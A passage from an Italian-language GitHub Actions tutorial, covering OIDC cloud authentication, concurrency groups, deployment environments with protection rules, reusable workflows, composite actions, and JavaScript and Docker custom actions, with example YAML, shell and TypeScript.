  --issuer-uri="https://token.actions.githubusercontent.com"

# Concedere al pool l'accesso al service account
gcloud iam service-accounts add-iam-policy-binding \
  deploy-sa@my-project.iam.gserviceaccount.com \
  --role="roles/iam.workloadIdentityUser" \
  --member="principalSet://iam.googleapis.com/projects/123456789/locations/global/workloadIdentityPools/github-pool/attribute.repository/my-org/my-repo"
```

#### Azure — Federated Identity Credential

```yaml
# Workflow Azure OIDC completo
jobs:
  deploy-azure:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    environment: production
    steps:
      - uses: actions/checkout@v4

      - name: Azure Login via OIDC
        uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}

      - name: Deploy to Azure Web App
        uses: azure/webapps-deploy@v3
        with:
          app-name: my-web-app
          package: dist/

      - name: Azure Logout
        if: always()
        run: az logout
```

```bash
# Setup Azure Federated Identity Credential
az ad app federated-credential create \
  --id <APP_OBJECT_ID> \
  --parameters '{
    "name": "github-actions-main",
    "issuer": "https://token.actions.githubusercontent.com",
    "subject": "repo:org/repo:ref:refs/heads/main",
    "audiences": ["api://AzureADTokenExchange"],
    "description": "GitHub Actions deploy from main"
  }'

# Per environment specifici
az ad app federated-credential create \
  --id <APP_OBJECT_ID> \
  --parameters '{
    "name": "github-actions-production",
    "issuer": "https://token.actions.githubusercontent.com",
    "subject": "repo:org/repo:environment:production",
    "audiences": ["api://AzureADTokenExchange"]
  }'
```

---

## Concurrency Control

Il concurrency control è una delle funzionalità più importanti per evitare esecuzioni duplicate e conflitti nei deploy. Permette di raggruppare workflow o job in "concurrency groups" e decidere se mettere in coda o cancellare le esecuzioni sovrapposte.

### Concurrency a Livello di Workflow

```yaml
name: CI
on: push

# Un solo run alla volta per branch
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true  # Cancella il run precedente se ne arriva uno nuovo
```

### Concurrency a Livello di Job

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    concurrency:
      group: deploy-${{ github.ref }}
      cancel-in-progress: false  # NON cancellare deploy in corso — mettere in coda
    steps:
      - run: ./deploy.sh
```

### Pattern per Pull Request

Per le pull request, il pattern più comune è cancellare i run precedenti quando arriva un nuovo push:

```yaml
name: PR CI
on:
  pull_request:
    types: [opened, synchronize, reopened]

concurrency:
  group: pr-${{ github.event.pull_request.number }}
  cancel-in-progress: true
```

### Pattern per Deploy (Non Cancellare Mai)

Per i deploy, non si vuole mai cancellare un'esecuzione in corso — potrebbe lasciare l'infrastruttura in uno stato inconsistente:

```yaml
name: Deploy
on:
  push:
    branches: [main]

concurrency:
  group: deploy-production
  cancel-in-progress: false  # Le nuove esecuzioni attendono in coda
```

### Concurrency con Matrix Strategy

La concurrency si applica anche ai singoli job generati dalla matrix:

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
    concurrency:
      group: test-${{ matrix.os }}-${{ github.ref }}
      cancel-in-progress: true
```

### Concurrency Condizionale

Usare espressioni per decidere dinamicamente se cancellare i run in corso:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  # Cancellare solo sui feature branch, mai su main
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}
```

### Concurrency con workflow_dispatch

Per i workflow manuali, includere gli input nel gruppo di concurrency per permettere esecuzioni parallele con parametri diversi:

```yaml
name: Manual Deploy
on:
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]
      version:
        type: string

concurrency:
  group: deploy-${{ inputs.environment }}
  cancel-in-progress: false
```

### Contesti disponibili nelle espressioni di concurrency

È importante sapere quali contesti sono disponibili a ciascun livello:

| Livello | Contesti disponibili |
|---------|---------------------|
| Workflow | `github`, `inputs`, `vars` |
| Job | `github`, `inputs`, `vars`, `needs`, `strategy`, `matrix` |

### Concurrency per Ambienti di Deploy Multipli

Quando si gestiscono deploy a più ambienti (dev, staging, production), il concurrency control diventa critico per evitare che deploy sovrapposti corrompano lo stato dell'infrastruttura:

```yaml
name: Multi-Environment Deploy
on:
  push:
    branches: [main, 'release/**']

jobs:
  deploy-dev:
    runs-on: ubuntu-latest
    environment: development
    concurrency:
      group: deploy-development
      cancel-in-progress: true  # Dev può essere cancellato
    steps:
      - run: ./deploy.sh dev

  deploy-staging:
    needs: deploy-dev
    runs-on: ubuntu-latest
    environment: staging
    concurrency:
      group: deploy-staging
      cancel-in-progress: false  # Staging non deve essere interrotto
    steps:
      - run: ./deploy.sh staging

  deploy-prod:
    needs: deploy-staging
    if: startsWith(github.ref, 'refs/heads/release/')
    runs-on: ubuntu-latest
    environment: production
    concurrency:
      group: deploy-production
      cancel-in-progress: false  # Produzione MAI interrotta
    steps:
      - run: ./deploy.sh production
```

### Concurrency e Rollback

Un pattern avanzato combina concurrency control con la capacità di rollback. Se un deploy in corso viene sostituito da uno nuovo, il deploy precedente viene cancellato (su ambienti non critici) e il nuovo deploy include la logica di rollback in caso di fallimento:

```yaml
jobs:
  deploy-with-rollback:
    runs-on: ubuntu-latest
    environment: staging
    concurrency:
      group: deploy-staging-${{ github.ref }}
      cancel-in-progress: true
    steps:
      - uses: actions/checkout@v4

      - name: Get current version
        id: current
        run: |
          CURRENT=$(curl -s https://staging.example.com/api/version | jq -r '.version')
          echo "version=$CURRENT" >> "$GITHUB_OUTPUT"

      - name: Deploy new version
        id: deploy
        run: ./deploy.sh staging ${{ github.sha }}

      - name: Smoke test
        id: smoke
        run: |
          sleep 10
          curl --fail https://staging.example.com/health || exit 1

      - name: Rollback on failure
        if: failure() && steps.deploy.outcome == 'success'
        run: |
          echo "::warning::Deploying rollback to version ${{ steps.current.outputs.version }}"
          ./deploy.sh staging "${{ steps.current.outputs.version }}"
```

---

## Environments e Protection Rules

### Configurazione degli Environments

```yaml
jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    steps:
      - run: echo "Deploying to staging"

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://www.example.com
    steps:
      - run: echo "Deploying to production"
```

### Protection Rules

Le protection rules si configurano in Settings > Environments > [environment]:

1. **Required Reviewers**: Specificare utenti o team che devono approvare il deploy
2. **Wait Timer**: Ritardo obbligatorio prima del deploy (es. 30 minuti)
3. **Deployment Branches**: Limitare quali branch possono deployare nell'ambiente
4. **Custom Rules**: Regole personalizzate con GitHub Apps

```bash
# Configurare un environment via API
gh api repos/{owner}/{repo}/environments/production -X PUT \
  --input - << 'EOF'
{
  "wait_timer": 30,
  "prevent_self_review": true,
  "reviewers": [
    {"type": "User", "id": 12345},
    {"type": "Team", "id": 67890}
  ],
  "deployment_branch_policy": {
    "protected_branches": true,
    "custom_branch_policies": false
  }
}
EOF
```

### Environment Secrets

```bash
# Aggiungere un segreto a un environment specifico
gh secret set DATABASE_URL --env production --body "postgres://..."
gh secret set DATABASE_URL --env staging --body "postgres://staging..."

# I secrets di environment hanno priorità su quelli del repository
```

### Custom Deployment Protection Rules

Le custom deployment protection rules permettono di integrare servizi di terze parti come gate automatici per i deploy. Questa funzionalità è disponibile per repository pubblici (Free/Pro/Team) e per tutti i repository su GitHub Enterprise Cloud.

#### Come funzionano

Quando un workflow raggiunge un job che referenzia un environment con custom protection rules, il deploy viene messo in pausa. GitHub invia un webhook `deployment_protection_rule` alla GitHub App configurata. L'app valuta le condizioni (metriche di Datadog, SLO di Honeycomb, change request di ServiceNow, ecc.) e risponde con un'approvazione o un rifiuto.

```yaml
# Workflow che usa un environment con custom protection rules
name: Production Deploy
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://www.example.com
    # Il deploy si blocca automaticamente in attesa di:
    # 1. Approvazione da 2 reviewer (configurata sull'environment)
    # 2. Wait timer di 15 minuti
    # 3. Controllo automatico di Datadog (SLO > 99.5%)
    # 4. Controllo automatico di ServiceNow (change request approvata)
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh production
```

#### Configurare Custom Protection Rules via API

```bash
# Elencare le custom protection rules di un environment
gh api repos/{owner}/{repo}/environments/production/deployment_protection_rules

# Aggiungere una custom protection rule
gh api repos/{owner}/{repo}/environments/production/deployment_protection_rules -X POST \
  --field integration_id=12345

# Rimuovere una custom protection rule
gh api repos/{owner}/{repo}/environments/production/deployment_protection_rules/{rule_id} -X DELETE
```

### Pipeline di Deploy Multi-Environment Completo

```yaml
name: Multi-Environment Deploy
on:
  push:
    branches: [main]
    tags: ['v*']

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.version }}
    steps:
      - uses: actions/checkout@v4
      - name: Determine version
        id: version
        run: |
          if [[ "${{ github.ref }}" == refs/tags/* ]]; then
            echo "version=${{ github.ref_name }}" >> "$GITHUB_OUTPUT"
          else
            echo "version=sha-${GITHUB_SHA::8}" >> "$GITHUB_OUTPUT"
          fi

      - run: npm ci && npm run build

      - uses: actions/upload-artifact@v4
        with:
          name: app-${{ steps.version.outputs.version }}
          path: dist/

  deploy-dev:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: development
      url: https://dev.example.com
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: app-${{ needs.build.outputs.version }}
      - run: echo "Deployed ${{ needs.build.outputs.version }} to development"

  deploy-staging:
    needs: [build, deploy-dev]
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: app-${{ needs.build.outputs.version }}
      - run: echo "Deployed ${{ needs.build.outputs.version }} to staging"

  smoke-test:
    needs: deploy-staging
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run smoke tests against staging
        run: |
          npx playwright test --project=smoke \
            --base-url https://staging.example.com

  deploy-production:
    needs: [build, smoke-test]
    if: startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://www.example.com
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: app-${{ needs.build.outputs.version }}
      - run: echo "Deployed ${{ needs.build.outputs.version }} to production"
```

### Environment Variables e Configuration Variables

Oltre ai secrets, gli environment supportano anche configuration variables (non sensibili):

```yaml
# Le variables sono accessibili tramite il contesto vars
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - name: Deploy with environment-specific config
        env:
          API_URL: ${{ vars.API_URL }}
          LOG_LEVEL: ${{ vars.LOG_LEVEL }}
          FEATURE_FLAGS: ${{ vars.FEATURE_FLAGS }}
        run: |
          echo "Deploying with API_URL=$API_URL"
          echo "Log level: $LOG_LEVEL"
          ./deploy.sh
```

```bash
# Gestire le variables via CLI
gh variable set API_URL --env production --body "https://api.example.com"
gh variable set API_URL --env staging --body "https://api-staging.example.com"
gh variable list --env production
```

---

## Reusable Workflows

### Definire un Workflow Riutilizzabile

```yaml
# .github/workflows/reusable-deploy.yml
name: Reusable Deploy Workflow

on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
      version:
        required: true
        type: string
      dry_run:
        required: false
        type: boolean
        default: false
    secrets:
      deploy_token:
        required: true
      ssh_key:
        required: false
    outputs:
      deploy_url:
        description: "URL del deploy"
        value: ${{ jobs.deploy.outputs.url }}

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: ${{ inputs.environment }}
    outputs:
      url: ${{ steps.deploy.outputs.url }}
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ inputs.version }}

      - name: Deploy
        id: deploy
        env:
          DEPLOY_TOKEN: ${{ secrets.deploy_token }}
        run: |
          if [ "${{ inputs.dry_run }}" = "true" ]; then
            echo "DRY RUN: Would deploy ${{ inputs.version }} to ${{ inputs.environment }}"
            echo "url=https://${{ inputs.environment }}.example.com" >> "$GITHUB_OUTPUT"
          else
            ./deploy.sh ${{ inputs.environment }} ${{ inputs.version }}
            echo "url=https://${{ inputs.environment }}.example.com" >> "$GITHUB_OUTPUT"
          fi
```

### Chiamare un Workflow Riutilizzabile

```yaml
# .github/workflows/deploy-prod.yml
name: Deploy to Production

on:
  push:
    tags: ['v*']

jobs:
  deploy-staging:
    uses: ./.github/workflows/reusable-deploy.yml
    with:
      environment: staging
      version: ${{ github.ref_name }}
    secrets:
      deploy_token: ${{ secrets.DEPLOY_TOKEN }}

  deploy-production:
    needs: deploy-staging
    uses: ./.github/workflows/reusable-deploy.yml
    with:
      environment: production
      version: ${{ github.ref_name }}
    secrets:
      deploy_token: ${{ secrets.DEPLOY_TOKEN }}

  # Chiamare un workflow da un altro repository
  shared-workflow:
    uses: org/shared-workflows/.github/workflows/ci.yml@main
    with:
      node-version: '20'
    secrets: inherit  # Passare tutti i segreti disponibili
```

### Limitazioni dei Reusable Workflows

- Massimo 4 livelli di nesting (workflow che chiamano workflow)
- Massimo 20 reusable workflows per file
- Le variabili d'ambiente del chiamante non vengono ereditate
- I segreti devono essere passati esplicitamente (o con `secrets: inherit`)

### Reusable Workflow con Matrix Strategy

Un reusable workflow può essere chiamato con una matrix strategy nel workflow chiamante:

```yaml
# Workflow chiamante con matrix
name: Deploy All Environments
on:
  workflow_dispatch:

jobs:
  deploy:
    strategy:
      fail-fast: false
      max-parallel: 1  # Deploy sequenziale per sicurezza
      matrix:
        environment: [development, staging, production]
    uses: ./.github/workflows/reusable-deploy.yml
    with:
      environment: ${{ matrix.environment }}
      version: ${{ github.sha }}
    secrets: inherit
```

### Reusable Workflow per CI Standardizzata

Pattern completo per un'organizzazione che vuole standardizzare la CI su tutti i repository:

```yaml
# org/shared-workflows/.github/workflows/standard-ci.yml
name: Standard CI Pipeline

on:
  workflow_call:
    inputs:
      node-version:
        type: string
        default: '20'
      package-manager:
        type: string
        default: 'npm'
      run-e2e:
        type: boolean
        default: false
      coverage-threshold:
        type: number
        default: 80
    secrets:
      SONAR_TOKEN:
        required: false
      CODECOV_TOKEN:
        required: false
    outputs:
      build-version:
        description: "Versione del build"
        value: ${{ jobs.build.outputs.version }}
      test-passed:
        description: "Se i test sono passati"
        value: ${{ jobs.test.outputs.passed }}

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
          cache: ${{ inputs.package-manager }}
      - run: ${{ inputs.package-manager }} ${{ inputs.package-manager == 'npm' && 'ci' || 'install --frozen-lockfile' }}
      - run: ${{ inputs.package-manager }} run lint

  test:
    runs-on: ubuntu-latest
    outputs:
      passed: ${{ steps.test.outcome == 'success' }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
          cache: ${{ inputs.package-manager }}
      - run: ${{ inputs.package-manager }} ${{ inputs.package-manager == 'npm' && 'ci' || 'install --frozen-lockfile' }}
      - name: Run tests
        id: test
        run: ${{ inputs.package-manager }} run test -- --coverage
      - name: Check coverage threshold
        run: |
          COVERAGE=$(cat coverage/coverage-summary.json | jq '.total.lines.pct')
          if (( $(echo "$COVERAGE < ${{ inputs.coverage-threshold }}" | bc -l) )); then
            echo "::error::Coverage $COVERAGE% is below threshold ${{ inputs.coverage-threshold }}%"
            exit 1
          fi

  build:
    needs: [lint, test]
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.version }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
          cache: ${{ inputs.package-manager }}
      - run: ${{ inputs.package-manager }} ${{ inputs.package-manager == 'npm' && 'ci' || 'install --frozen-lockfile' }}
      - run: ${{ inputs.package-manager }} run build
      - name: Determine version
        id: version
        run: echo "version=$(node -p 'require(\"./package.json\").version')-$(echo $GITHUB_SHA | cut -c1-8)" >> "$GITHUB_OUTPUT"
      - uses: actions/upload-artifact@v4
        with:
          name: build-${{ steps.version.outputs.version }}
          path: dist/

  e2e:
    if: inputs.run-e2e
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
          cache: ${{ inputs.package-manager }}
      - run: ${{ inputs.package-manager }} ${{ inputs.package-manager == 'npm' && 'ci' || 'install --frozen-lockfile' }}
      - run: npx playwright install --with-deps
      - run: ${{ inputs.package-manager }} run test:e2e
```

### Versioning dei Reusable Workflows

```yaml
# Riferire il workflow con tag semantico
uses: org/shared-workflows/.github/workflows/ci.yml@v2.1.0

# Riferire con SHA per massima sicurezza
uses: org/shared-workflows/.github/workflows/ci.yml@a1b2c3d4e5f6

# Riferire con branch (solo per sviluppo, mai in produzione)
uses: org/shared-workflows/.github/workflows/ci.yml@main
```

---

## Composite Actions

### Creare una Composite Action

```yaml
# .github/actions/setup-project/action.yml
name: 'Setup Project'
description: 'Setup Node.js, install dependencies, and prepare the project'

inputs:
  node-version:
    description: 'Node.js version'
    required: false
    default: '20'
  install-command:
    description: 'Install command'
    required: false
    default: 'npm ci'

outputs:
  cache-hit:
    description: 'Whether the cache was hit'
    value: ${{ steps.cache.outputs.cache-hit }}

runs:
  using: 'composite'
  steps:
    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}

    - name: Cache dependencies
      id: cache
      uses: actions/cache@v4
      with:
        path: node_modules
        key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}

    - name: Install dependencies
      if: steps.cache.outputs.cache-hit != 'true'
      shell: bash
      run: ${{ inputs.install-command }}

    - name: Verify installation
      shell: bash
      run: node --version && npm --version
```

### Usare una Composite Action

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Action locale
      - uses: ./.github/actions/setup-project
        with:
          node-version: '20'

      - run: npm run build
```

### Composite Action vs Reusable Workflow

| Aspetto | Composite Action | Reusable Workflow |
|---------|-----------------|-------------------|
| Scope | Step-level (dentro un job) | Job-level (job completi) |
| Runner | Stesso runner del job chiamante | Runner proprio |
| Secrets | Accesso ai secrets del job | Devono essere passati |
| Artifacts | Condivisi nel job | Richiedono upload/download |
| Complessità | Bassa | Media |
| Uso | Raggruppare step ripetuti | Standardizzare interi job |
| Nesting | Fino a 10 livelli | Fino a 4 livelli |
| Shell | Deve specificare `shell` in ogni `run` step | Eredita dal runner |
| Condivisione | Stessa repo o marketplace | Cross-repository con ref |

### Composite Action Avanzata — Multi-Package Manager

Una composite action che gestisce automaticamente diversi package manager:

```yaml
# .github/actions/smart-setup/action.yml
name: 'Smart Project Setup'
description: 'Auto-detect package manager, install deps, and cache intelligently'

inputs:
  node-version:
    description: 'Node.js version'
    required: false
    default: '20'
  working-directory:
    description: 'Working directory'
    required: false
    default: '.'

outputs:
  cache-hit:
    description: 'Whether dependencies were cached'
    value: ${{ steps.cache.outputs.cache-hit }}
  package-manager:
    description: 'Detected package manager'
    value: ${{ steps.detect.outputs.manager }}

runs:
  using: 'composite'
  steps:
    - name: Detect package manager
      id: detect
      shell: bash
      working-directory: ${{ inputs.working-directory }}
      run: |
        if [ -f "pnpm-lock.yaml" ]; then
          echo "manager=pnpm" >> "$GITHUB_OUTPUT"
          echo "lockfile=pnpm-lock.yaml" >> "$GITHUB_OUTPUT"
          echo "install_cmd=pnpm install --frozen-lockfile" >> "$GITHUB_OUTPUT"
          echo "cache_path=~/.local/share/pnpm/store/v3" >> "$GITHUB_OUTPUT"
        elif [ -f "yarn.lock" ]; then
          echo "manager=yarn" >> "$GITHUB_OUTPUT"
          echo "lockfile=yarn.lock" >> "$GITHUB_OUTPUT"
          echo "install_cmd=yarn install --frozen-lockfile" >> "$GITHUB_OUTPUT"
          echo "cache_path=~/.cache/yarn" >> "$GITHUB_OUTPUT"
        elif [ -f "bun.lockb" ]; then
          echo "manager=bun" >> "$GITHUB_OUTPUT"
          echo "lockfile=bun.lockb" >> "$GITHUB_OUTPUT"
          echo "install_cmd=bun install --frozen-lockfile" >> "$GITHUB_OUTPUT"
          echo "cache_path=~/.bun/install/cache" >> "$GITHUB_OUTPUT"
        else
          echo "manager=npm" >> "$GITHUB_OUTPUT"
          echo "lockfile=package-lock.json" >> "$GITHUB_OUTPUT"
          echo "install_cmd=npm ci" >> "$GITHUB_OUTPUT"
          echo "cache_path=~/.npm" >> "$GITHUB_OUTPUT"
        fi

    - name: Install pnpm if needed
      if: steps.detect.outputs.manager == 'pnpm'
      shell: bash
      run: npm install -g pnpm

    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
        cache: ${{ steps.detect.outputs.manager }}

    - name: Cache dependencies
      id: cache
      uses: actions/cache@v4
      with:
        path: |
          ${{ steps.detect.outputs.cache_path }}
          ${{ inputs.working-directory }}/node_modules
        key: ${{ runner.os }}-${{ steps.detect.outputs.manager }}-${{ hashFiles(format('{0}/{1}', inputs.working-directory, steps.detect.outputs.lockfile)) }}
        restore-keys: |
          ${{ runner.os }}-${{ steps.detect.outputs.manager }}-

    - name: Install dependencies
      shell: bash
      working-directory: ${{ inputs.working-directory }}
      run: ${{ steps.detect.outputs.install_cmd }}
```

### Composite Action per Docker Build Standardizzato

```yaml
# .github/actions/docker-build/action.yml
name: 'Docker Build & Push'
description: 'Build, tag, and push Docker image with best practices'

inputs:
  image-name:
    description: 'Full image name (e.g., ghcr.io/org/app)'
    required: true
  dockerfile:
    description: 'Path to Dockerfile'
    required: false
    default: 'Dockerfile'
  context:
    description: 'Build context'
    required: false
    default: '.'
  push:
    description: 'Push the image'
    required: false
    default: 'true'
  platforms:
    description: 'Target platforms'
    required: false
    default: 'linux/amd64'

outputs:
  image-tag:
    description: 'Primary image tag'
    value: ${{ steps.meta.outputs.tags }}
  image-digest:
    description: 'Image digest'
    value: ${{ steps.build.outputs.digest }}

runs:
  using: 'composite'
  steps:
    - name: Set up Docker Buildx
      uses: docker/setup-buildx-action@v3

    - name: Docker meta
      id: meta
      uses: docker/metadata-action@v5
      with:
        images: ${{ inputs.image-name }}
        tags: |
          type=sha,prefix=
          type=ref,event=branch
          type=semver,pattern={{version}}
          type=semver,pattern={{major}}.{{minor}}

    - name: Build and push
      id: build
      uses: docker/build-push-action@v6
      with:
        context: ${{ inputs.context }}
        file: ${{ inputs.dockerfile }}
        push: ${{ inputs.push }}
        tags: ${{ steps.meta.outputs.tags }}
        labels: ${{ steps.meta.outputs.labels }}
        platforms: ${{ inputs.platforms }}
        cache-from: type=gha
        cache-to: type=gha,mode=max
        provenance: true
        sbom: true
```

### Nesting di Composite Actions

Le composite actions possono richiamare altre composite actions, fino a 10 livelli di profondità:

```yaml
# .github/actions/full-ci/action.yml
name: 'Full CI'
description: 'Complete CI pipeline in a single action'

runs:
  using: 'composite'
  steps:
    # Primo livello: setup del progetto (che a sua volta potrebbe usare altre actions)
    - uses: ./.github/actions/smart-setup
      with:
        node-version: '20'

    # Secondo livello: lint
    - name: Lint
      shell: bash
      run: npm run lint

    # Terzo livello: test
    - name: Test with coverage
      shell: bash
      run: npm run test:coverage

    # Quarto livello: build
    - uses: ./.github/actions/docker-build
      with:
        image-name: ghcr.io/${{ github.repository }}
        push: 'false'
```

---

## Custom Actions JavaScript

Le custom actions JavaScript (o TypeScript) sono il tipo più potente e flessibile di action personalizzata. A differenza delle composite actions, permettono logica programmatica complessa e accesso diretto all'API di GitHub tramite il toolkit ufficiale.

### Struttura di una JavaScript Action

```
my-action/
├── action.yml          # Metadata dell'action
├── src/
│   └── index.ts        # Codice sorgente TypeScript
├── dist/
│   └── index.js        # Codice compilato (generato da ncc)
├── package.json
├── tsconfig.json
└── __tests__/
    └── index.test.ts
```

### Metadata dell'Action

```yaml
# action.yml
name: 'PR Size Labeler'
description: 'Automatically labels PRs based on the number of changed lines'
author: 'My Organization'

inputs:
  github-token:
    description: 'GitHub token for API access'
    required: true
    default: ${{ github.token }}
  xs-max:
    description: 'Max lines for XS label'
    required: false
    default: '10'
  s-max:
    description: 'Max lines for S label'
    required: false
    default: '50'
  m-max:
    description: 'Max lines for M label'
    required: false
    default: '200'
  l-max:
    description: 'Max lines for L label'
    required: false
    default: '500'

outputs:
  label:
    description: 'The label that was applied'
  total-changes:
    description: 'Total number of changed lines'

runs:
  using: 'node20'
  main: 'dist/index.js'

branding:
  icon: 'tag'
  color: 'blue'
```

### Implementazione TypeScript

```typescript
// src/index.ts
import * as core from '@actions/core';
import * as github from '@actions/github';

interface SizeConfig {
  label: string;
  max: number;
  color: string;
}

async function run(): Promise<void> {
  try {
    const token = core.getInput('github-token', { required: true });
    const octokit = github.getOctokit(token);
    const context = github.context;

    if (!context.payload.pull_request) {
      core.warning('This action only works on pull_request events');
      return;
    }

    const prNumber = context.payload.pull_request.number;

    // Ottenere i file modificati
    const { data: files } = await octokit.rest.pulls.listFiles({
      owner: context.repo.owner,
      repo: context.repo.repo,
      pull_number: prNumber,
    });

    const totalChanges = files.reduce(
      (sum, file) => sum + file.additions + file.deletions,
      0
    );

    // Configurazione delle taglie
    const sizes: SizeConfig[] = [
      { label: 'size/XS', max: parseInt(core.getInput('xs-max')), color: '3CBF00' },
      { label: 'size/S', max: parseInt(core.getInput('s-max')), color: '5D9801' },
      { label: 'size/M', max: parseInt(core.getInput('m-max')), color: '7F7203' },
      { label: 'size/L', max: parseInt(core.getInput('l-max')), color: 'A14C05' },
      { label: 'size/XL', max: Infinity, color: 'C32607' },
    ];

    // Determinare la taglia
    const size = sizes.find((s) => totalChanges <= s.max)!;

    // Rimuovere le etichette di taglia esistenti
    const currentLabels = context.payload.pull_request.labels || [];
    for (const label of currentLabels) {
      if (label.name.startsWith('size/')) {
        await octokit.rest.issues.removeLabel({
          owner: context.repo.owner,
          repo: context.repo.repo,
          issue_number: prNumber,
          name: label.name,
        });
      }
    }

    // Creare l'etichetta se non esiste
    try {
      await octokit.rest.issues.createLabel({
        owner: context.repo.owner,
        repo: context.repo.repo,
        name: size.label,
        color: size.color,
      });
    } catch {
      // L'etichetta esiste già — va bene
    }

    // Applicare la nuova etichetta
    await octokit.rest.issues.addLabels({
      owner: context.repo.owner,
      repo: context.repo.repo,
      issue_number: prNumber,
      labels: [size.label],
    });

    // Impostare gli output
    core.setOutput('label', size.label);
    core.setOutput('total-changes', totalChanges.toString());

    // Aggiungere un summary al job
    core.summary
      .addHeading('PR Size Analysis', 3)
      .addTable([
        ['Metric', 'Value'],
        ['Total changes', totalChanges.toString()],
        ['Label', size.label],
        ['Files changed', files.length.toString()],
      ])
      .write();

    core.info(`Applied label ${size.label} for ${totalChanges} changed lines`);
  } catch (error) {
    if (error instanceof Error) {
      core.setFailed(error.message);
    }
  }
}

run();
```

### Build e Distribuzione

```bash
# package.json (dipendenze essenziali)
# "@actions/core": "^1.10.1"
# "@actions/github": "^6.0.0"
# "@vercel/ncc": "^0.38.1" (devDependency)
# "typescript": "^5.4.0" (devDependency)

# Compilare e bundlare con ncc
npx ncc build src/index.ts -o dist --source-map --license licenses.txt

# Il risultato è un singolo file dist/index.js che include tutte le dipendenze
# Committare dist/ nel repository — GitHub esegue il file compilato, non il sorgente
```

### Pacchetti del Toolkit @actions

| Pacchetto | Scopo |
|-----------|-------|
| `@actions/core` | Input/output, logging, annotations, summary, secrets masking |
| `@actions/github` | Client Octokit autenticato, contesto del workflow |
| `@actions/exec` | Eseguire comandi shell con streaming dell'output |
| `@actions/io` | Operazioni su file (copy, move, find, which) |
| `@actions/tool-cache` | Download e caching di tool binari |
| `@actions/cache` | API per il caching programmatico |
| `@actions/artifact` | Upload e download di artifacts programmatici |
| `@actions/glob` | Pattern matching per file paths |
| `@actions/http-client` | Client HTTP leggero |

---

## Custom Actions Docker

Le custom actions Docker eseguono il codice all'interno di un container Docker, garantendo un ambiente completamente controllato e riproducibile. Sono ideali per action che richiedono tool specifici, dipendenze di sistema o ambienti particolari.

### Limitazioni importanti

- Funzionano solo su runner Linux (non su macOS o Windows)
- Più lente delle JavaScript actions a causa del tempo di build/pull del container
- Il container viene eseguito come root per default

### Struttura di una Docker Action

```
my-docker-action/
├── action.yml
├── Dockerfile
├── entrypoint.sh
└── scripts/
    └── analyze.py
```

### Metadata della Docker Action

```yaml
# action.yml
name: 'Security Scanner'
description: 'Scan code for security vulnerabilities using custom tools'

inputs:
  scan-path:
    description: 'Path to scan'
    required: false
    default: '.'
  severity-threshold:
    description: 'Minimum severity to report (low, medium, high, critical)'
    required: false
    default: 'medium'
  fail-on-findings:
    description: 'Fail the action if findings are detected'
    required: false
    default: 'true'

outputs:
  findings-count:
    description: 'Number of findings'
  report-path:
    description: 'Path to the HTML report'

runs:
  using: 'docker'
  image: 'Dockerfile'
  args:
    - ${{ inputs.scan-path }}
    - ${{ inputs.severity-threshold }}
    - ${{ inputs.fail-on-findings }}
  env:
    SCAN_TIMESTAMP: ${{ github.run_id }}
```

### Dockerfile dell'Action

```dockerfile
FROM python:3.12-slim

RUN pip install --no-cache-dir bandit safety semgrep && \
    apt-get update && \
    apt-get install -y --no-install-recommends jq && \
    rm -rf /var/lib/apt/lists/*

COPY entrypoint.sh /entrypoint.sh
COPY scripts/ /scripts/
RUN chmod +x /entrypoint.sh

ENTRYPOINT ["/entrypoint.sh"]
```

### Entrypoint Script

```bash
#!/bin/bash
set -euo pipefail

SCAN_PATH="${1:-.}"
SEVERITY="${2:-medium}"
FAIL_ON_FINDINGS="${3:-true}"

echo "::group::Running security scan on $SCAN_PATH"

# Eseguire Bandit per Python
FINDINGS=0
if find "$SCAN_PATH" -name "*.py" -type f | head -1 | grep -q .; then
  echo "Scanning Python files with Bandit..."
  bandit -r "$SCAN_PATH" -f json -o /tmp/bandit-report.json \
